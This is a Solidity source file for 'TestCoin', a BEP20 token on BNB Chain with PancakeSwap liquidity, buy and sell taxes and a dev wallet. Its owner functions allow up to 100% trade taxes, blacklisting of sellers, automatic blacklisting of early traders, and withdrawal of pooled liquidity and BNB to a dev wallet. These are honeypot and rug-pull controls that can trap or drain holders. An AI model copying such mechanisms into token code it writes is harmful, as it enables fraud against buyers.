/**
 *Submitted for verification at BscScan.com on 2022-10-07
*/

//SPDX-License-Identifier: UNLICENSED

pragma solidity =0.8.14;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}


interface IPancakeERC20 {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
}

interface IPancakeFactory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IPancakeRouter01 {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getamountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getamountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getamountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getamountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IPancakeRouter02 is IPancakeRouter01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

abstract contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() external onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) external onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {

        uint256 size;

        assembly { size := extcodesize(account) }
        return size > 0;
    }

  
    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");


        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

   
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }


    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }

    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }


    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");


        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }


    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }


    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");

   
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }


    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {

            if (returndata.length > 0) {

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


library EnumerableSet {
   

    struct Set {
        
        bytes32[] _values;

       
        mapping (bytes32 => uint256) _indexes;
    }

    
    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }


    function _remove(Set storage set, bytes32 value) private returns (bool) {
        
        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) { 

            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;


            bytes32 lastvalue = set._values[lastIndex];

            set._values[toDeleteIndex] = lastvalue;

            set._indexes[lastvalue] = valueIndex; 


            set._values.pop();

            delete set._indexes[value];

            return true;
        } else {
            return false;
        }
    }


    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }


    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }

  
    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        require(set._values.length > index, "EnumerableSet: index out of bounds");
        return set._values[index];
    }


    struct Bytes32Set {
        Set _inner;
    }

    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _add(set._inner, value);
    }

    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _remove(set._inner, value);
    }

   
    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
        return _contains(set._inner, value);
    }


    function length(Bytes32Set storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
        return _at(set._inner, index);
    }

    struct AddressSet {
        Set _inner;
    }

    
    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }

    
    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }

    
    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }

   
    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

   
    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }


    struct UintSet {
        Set _inner;
    }

    
    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }

 
    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        return _remove(set._inner, bytes32(value));
    }

   
    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return _contains(set._inner, bytes32(value));
    }

   
    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }

  
    function at(UintSet storage set, uint256 index) internal view returns (uint256) {
        return uint256(_at(set._inner, index));
    }
}


contract TestCoin is IBEP20, Ownable
{
    using Address for address;
    using EnumerableSet for EnumerableSet.AddressSet;

    event contractHadAChange(uint256 indexed value);
    event contractBoolChanged(bool indexed value);
    event contractAddressChanged(address indexed value);
    event botWatcher(address indexed value);
    
    
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    EnumerableSet.AddressSet private _excluded;
    EnumerableSet.AddressSet private _botWatched;

    string private constant _name = 'TEST';
    string private constant _symbol = 'TC';
    uint8 private constant _decimals = 9;
    uint256 public constant InitialSupply= 1000000000 * 10**_decimals;

    address private PancakeRouter=0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;
    //address private PancakeRouter=0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;

    uint256 contractTokensToSell = 1000000000 * 10**_decimals;

    address public devAccount1=payable(0xeDAF9684cAC320E095933207F9Db9445017bc429);
    address public devAccount2=payable(0xeDAF9684cAC320E095933207F9Db9445017bc429);

    uint256 private tradeStartedAt; 
    uint256 private _circulatingSupply =InitialSupply;
    uint256 public  balanceLimit = _circulatingSupply;
    uint256 public  sellLimit = _circulatingSupply;
	uint256 private maxBuyAmount = 20000000 * 10**_decimals;

    uint16 public constant maxBuyTimeLock= 9 seconds;

    uint256 private constant lpLockTimeInSeconds= 1800;

	uint256 private botWatcherEnabled = 0; 
    uint256 private botWatcherTime = 600; 

    uint8 private _burnTax;
    uint8 private _lpTax;
    uint8 private _devTax;    

    uint8 private _bTax;
    uint8 private _sTax;
    uint8 private _tTax;
       
    address private _pancakePairAddress; 
    IPancakeRouter02 private _pancakeRouter;


    constructor () {
    
        uint256 deployerBalance=_circulatingSupply;
        _balances[msg.sender] = deployerBalance;
        emit Transfer(address(0), msg.sender, deployerBalance);

        _pancakeRouter = IPancakeRouter02(PancakeRouter);
       
        _pancakePairAddress = IPancakeFactory(_pancakeRouter.factory()).createPair(address(this), _pancakeRouter.WETH());
        
        balanceLimit=50000000 * 10**_decimals;
        sellLimit=10000000 * 10**_decimals;

        _bTax=5;
        _sTax=10;
        _tTax=10;

        _burnTax=0;
        _lpTax=2;
        _devTax=8;

    
        _excluded.add(devAccount1);
        _excluded.add(devAccount2);
        _excluded.add(msg.sender);
    
    }



 
    function _transfer(address sender, address recipient, uint256 amount) private{
        require(sender != address(0), "Transfer from zero");
        require(recipient != address(0), "Transfer to zero");
        
     
        bool isExcluded = (_excluded.contains(sender) || _excluded.contains(recipient));
        

        bool isContractTransfer=(sender==address(this) || recipient==address(this));
        
  
        address pancakeRouter=address(_pancakeRouter);
        bool isLiquidityTransfer = ((sender == _pancakePairAddress && recipient == pancakeRouter) 
        || (recipient == _pancakePairAddress && sender == pancakeRouter));

 
        bool isBuy=sender==_pancakePairAddress|| sender == pancakeRouter;
        bool isSell=recipient==_pancakePairAddress|| recipient == pancakeRouter;

        if(isContractTransfer || isLiquidityTransfer || isExcluded){
            _feelessTransfer(sender, recipient, amount);
        }
        else{ 
            require(allowToTrade,"Trading hasn't started yet.");
            _taxedTransfer(sender,recipient,amount,isBuy,isSell);
        }
    }
    function _taxedTransfer(address sender, address recipient, uint256 amount,bool isBuy,bool isSell) private{
        uint256 recipientBalance = _balances[recipient];
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Trying to transfer more tokens than you own.");

        uint8 tax;
        if(isSell){
            require(amount<=sellLimit,"Sell amount exceeds the max sell amount that prevents dumping!");
            require(_botWatched.contains(sender) == false, "Seller's address caught by Bot Watcher!");
            if (block.timestamp <= tradeStartedAt + botWatcherTime && botWatcherEnabled == 1) {
                _botWatched.add(sender);
                emit botWatcher(sender);
            }
            tax=_sTax;


        } else if(isBuy){
            require(recipientBalance+amount<=balanceLimit,"Amount would exceed recipients max balance.");
			require(amount <= maxBuyAmount,"Buy amount exceeds max buy amount");
            require(_botWatched.contains(recipient) == false, "Buyer's address caught by Bot Watcher!");
            if (block.timestamp <= tradeStartedAt + botWatcherTime && botWatcherEnabled == 1) {
                _botWatched.add(recipient);
                emit botWatcher(recipient);
            }
            tax=_bTax;

        } else {
            require(_botWatched.contains(sender) == false, "Sender's address caught by Bot Watcher!");
            require(_botWatched.contains(recipient) == false, "Recipient's address caught by Bot Watcher!");
            require(recipientBalance+amount<=balanceLimit,"Amount would exceed recipients max balance.");
            if (block.timestamp <= tradeStartedAt + botWatcherTime && botWatcherEnabled == 1) {
                _botWatched.add(sender);
                emit botWatcher(sender);
            }
            tax=_tTax;


        }     
      
        if((sender!=_pancakePairAddress)&&(!_isSwappingContractModifier)&&isSell)
            _swapContractToken();
        
        uint256 tokensToBeBurned=_calculateFee(amount, tax, _burnTax);
        uint256 contractToken=_calculateFee(amount, tax, _devTax+_lpTax);
        
        uint256 taxedAmount=amount-(tokensToBeBurned + contractToken);

      
        _removeToken(sender,amount);
        
        
        _balances[address(this)] += contractToken;
      
        _circulatingSupply-=tokensToBeBurned;

        
        _addToken(recipient, taxedAmount);
        
        emit Transfer(sender,recipient,taxedAmount);

    }

    
    function _feelessTransfer(address sender, address recipient, uint256 amount) private{
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "Transfer exceeds balance");
      
        _removeToken(sender,amount);
        
        _addToken(recipient, amount);
        
        emit Transfer(sender,recipient,amount);

    }
    
    function _calculateFee(uint256 amount, uint8 tax, uint8 taxPercent) private pure returns (uint256) {
        return (amount*tax*taxPercent) / 10000;
    }
  
  
    uint256 public devAmount;

  
    function _addToken(address addr, uint256 amount) private {
      
        uint256 newAmount=_balances[addr]+amount;
       
        _balances[addr]=newAmount;
    }
    
    
 
    function _removeToken(address addr, uint256 amount) private {
      
        uint256 newAmount=_balances[addr]-amount;
   
        _balances[addr]=newAmount;
    }


    uint256 public totalLPBNB;

    bool private _isSwappingContractModifier;
    modifier lockTheSwap {
        _isSwappingContractModifier = true;
        _;
        _isSwappingContractModifier = false;
    }


    function _swapContractToken() private lockTheSwap{
        uint256 contractBalance=_balances[address(this)];
        uint16 totalTax=_devTax+_lpTax;
        uint256 tokenToSwap = contractTokensToSell;
     
        if(contractBalance<tokenToSwap||totalTax==0){
            return;
        }
     
        uint256 tokenForLiquidity=(tokenToSwap*_lpTax)/totalTax;
        uint256 tokenForDevelopment= tokenToSwap-tokenForLiquidity;


        uint256 liqToken=tokenForLiquidity/2;
        uint256 liqBNBToken=tokenForLiquidity-liqToken;


        uint256 swapToken=liqBNBToken+tokenForDevelopment;

        uint256 initialBNBBalance = address(this).balance;
        _swapTokenForBNB(swapToken);
        uint256 newBNB=(address(this).balance - initialBNBBalance);

        uint256 liqBNB = (newBNB*liqBNBToken)/swapToken;
        _addLiquidity(liqToken, liqBNB);

        uint256 distributeBNB=(address(this).balance - initialBNBBalance);

        devAmount+=distributeBNB;
    }

    function _swapTokenForBNB(uint256 amount) private {
        _approve(address(this), address(_pancakeRouter), amount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _pancakeRouter.WETH();

        _pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _addLiquidity(uint256 tokenamount, uint256 bnbamount) private returns (uint256 tAmountSent, uint256 bnbAmountSent) {
        totalLPBNB+=bnbamount;
        uint256 minBNB = (bnbamount*75) / 100;
        uint256 minTokens = (tokenamount*75) / 100;
        _approve(address(this), address(_pancakeRouter), tokenamount);
        _pancakeRouter.addLiquidityETH{value: bnbamount}(
            address(this),
            tokenamount,
            minTokens,
            minBNB,
            address(this),
            block.timestamp
        );
        tAmountSent = tokenamount;
        bnbAmountSent = bnbamount;
        return (tAmountSent, bnbAmountSent);
    }


    function getLiquidityReleaseTimeInSeconds() external view returns (uint256){
        if(block.timestamp<_lpLockTimeR){
            return _lpLockTimeR-block.timestamp;
        }
        return 0;
    }

    function getBurnedTokens() external view returns(uint256){
        return (InitialSupply-_circulatingSupply)/10**_decimals;
    }

    function getLimits() external view returns(uint256 balance, uint256 sell){
        return(balanceLimit/10**_decimals, sellLimit/10**_decimals);
    }

    function getTaxes() external view returns(uint256 burnTax,uint256 liquidityTax, uint256 marketingTax, uint256 buyTax, uint256 sellTax, uint256 transferTax){
        return (_burnTax,_lpTax,_devTax,_bTax,_sTax,_tTax);
    }

    function removeDevBNB() external onlyOwner{
        uint256 amount=devAmount;
        devAmount=0;
        payable(devAccount1).transfer((amount*50) / 100);
        payable(devAccount2).transfer((amount-(amount*50) / 100));
          } 
	
	function changeMaxBuyAmount(uint256 newMaxAmount) external onlyOwner{
      maxBuyAmount=newMaxAmount * 10**_decimals;
      emit contractHadAChange(maxBuyAmount);
    }
    
    function devWalletChange(address newDevWallet) external onlyOwner{
      require(newDevWallet != address(0),
      "Cannot be 0 address.");
      devAccount1=payable(newDevWallet);
      emit contractAddressChanged(devAccount1);
    }
    
    function newDevWalletAccount2(address newDevWallet) external onlyOwner{
      require(newDevWallet != address(0),
      "Cannot be 0 address.");
      devAccount2=payable(newDevWallet);
      emit contractAddressChanged(devAccount2);
    }
   
    function setContractTokensToSell(uint256 newSellAmount) external onlyOwner{
        contractTokensToSell = newSellAmount;
        emit contractHadAChange(contractTokensToSell);
    }
    
   
    function addWalletExclusion(address exclusionAdd) external onlyOwner{
        _excluded.add(exclusionAdd);
        emit contractAddressChanged(exclusionAdd);
    }

   
    function removeWalletExclusion(address exclusionRemove) external onlyOwner{
        _excluded.remove(exclusionRemove);
        emit contractAddressChanged(exclusionRemove);
    }

   
    function checkBotWatcher(address submittedAddress) external view returns (bool botWatchTrue) {
        if (_botWatched.contains(submittedAddress) == true) {
            botWatchTrue = true;
            return botWatchTrue;
        }
        if (_botWatched.contains(submittedAddress) == false) {
            botWatchTrue = false;
            return botWatchTrue;
        }
    }

  
    function addBotWatcherAddress(address botWatcherAddress) external onlyOwner {
        _botWatched.add(botWatcherAddress);
        emit contractAddressChanged(botWatcherAddress);
    }


    function removeBotWatcherAddress(address botWatcherAddress) external onlyOwner {
        _botWatched.remove(botWatcherAddress);
        emit contractAddressChanged(botWatcherAddress);
    }
    
 
    function changeTaxes(uint8 burnTaxes, uint8 liquidityTaxes, uint8 devTaxes, uint8 buyTax, uint8 sellTax, uint8 transferTax) external onlyOwner{
        uint8 totalTax=burnTaxes+liquidityTaxes+devTaxes;
        require(totalTax==100, "All taxes combined need to equal 100%.");
        require(buyTax <= 100,
        "bTax cannot exceed 100.");
        require(sellTax <= 100,
        "sTax cannot exceed 100.");
        require(transferTax <= 100,
        "tTax cannot exceed 100.");

        _devTax=devTaxes;
        _burnTax=burnTaxes;
        _lpTax=liquidityTaxes;
        

        _sTax=sellTax;
        _tTax=transferTax;
        _bTax=buyTax;

        emit contractHadAChange(_sTax);
        emit contractHadAChange(_tTax);
        emit contractHadAChange(_burnTax);
        emit contractHadAChange(_lpTax);
        emit contractHadAChange(_bTax);
    }

 
    function lpCreate() external onlyOwner{
    _swapContractToken();
    }
    
    function changePancakeRouter(address newRouter) external onlyOwner {
        require(newRouter != address(0),
        "Cannot be 0 address.");
        PancakeRouter=newRouter;
        emit contractAddressChanged(PancakeRouter);
    }

    function changeLimits(uint256 newBalanceLimit, uint256 newSellLimit) external onlyOwner{

        require(newSellLimit<_circulatingSupply/100,
        "Sell limit cannot exceed 1% of the circulating supply.");

        balanceLimit=newBalanceLimit * 10**_decimals;
        sellLimit=newSellLimit * 10**_decimals;

        emit contractHadAChange(balanceLimit);
        emit contractHadAChange(sellLimit);
    }

    
    bool public allowToTrade;
    address private _lpAddress;

    function tradingStart() external onlyOwner{
        allowToTrade=true;
        tradeStartedAt=block.timestamp;
    }

    function lpTokenAddress(address liquidityAddress) external onlyOwner{
        require(liquidityAddress != address(0),
        "ERR: 0 ADDRESS NOT PERMITTED");
        _lpAddress=liquidityAddress;
    }


    uint256 private _lpLockTimeR;


    function _addLockTimeSeconds(uint256 secondsUntilUnlock) external onlyOwner{
        _addLockTime(secondsUntilUnlock+block.timestamp);
        emit contractHadAChange(secondsUntilUnlock+block.timestamp);
    }

    function _addLockTime(uint256 newUnlockTime) private{

        require(newUnlockTime>_lpLockTimeR,
        "Unlock time is less than existing.");
        _lpLockTimeR=newUnlockTime;
        emit contractHadAChange(_lpLockTimeR);
    }


    function lpReleaseAfterTimeUp() external onlyOwner returns (address tWAddress, uint256 amountSent) {

        require(block.timestamp >= _lpLockTimeR, "Lock not finished.");
        
        IPancakeERC20 liquidityToken = IPancakeERC20(_lpAddress);
        uint256 amount = liquidityToken.balanceOf(address(this));


        liquidityToken.transfer(devAccount1, amount);
        emit Transfer(address(this), devAccount1, amount);
        tWAddress = devAccount1;
        amountSent = amount;
        return (tWAddress, amountSent);
        
    }
 
    function lpRemoveXAfterTimeUp() external onlyOwner returns (uint256 updatedBalance) {
        require(block.timestamp >= _lpLockTimeR, "Lock not finished.");
        IPancakeERC20 liquidityToken = IPancakeERC20(_lpAddress);
        uint256 amount = liquidityToken.balanceOf(address(this));

        liquidityToken.approve(address(_pancakeRouter),amount);
        uint256 initialBNBBalance = address(this).balance;
        
        _pancakeRouter.removeLiquidityETHSupportingFeeOnTransferTokens(
            address(this),
            amount,
            (amount*75) / 100,
            (amount*75) / 100,
            address(this),
            block.timestamp
            );
        uint256 newBNBBalance = address(this).balance-initialBNBBalance;
        devAmount+=newBNBBalance;
        updatedBalance=newBNBBalance;
        return updatedBalance;
    }

    function remainingBNBWithdraw() external onlyOwner{
        require(block.timestamp >= _lpLockTimeR, "Lock not finished.");
        (bool sent,) =devAccount1.call{value: (address(this).balance)}("");
        require(sent,
        "BNB not sent.");
    }

    receive() external payable {}
    fallback() external payable {}

    function getOwner() external view override returns (address) {
        return owner();
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _circulatingSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) external view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "Approve from zero");
        require(spender != address(0), "Approve to zero");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount, "Transfer > allowance");

        _approve(sender, msg.sender, currentAllowance - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
        uint256 currentAllowance = _allowances[msg.sender][spender];
        require(currentAllowance >= subtractedValue, "<0 allowance");

        _approve(msg.sender, spender, currentAllowance - subtractedValue);
        return true;
    }

}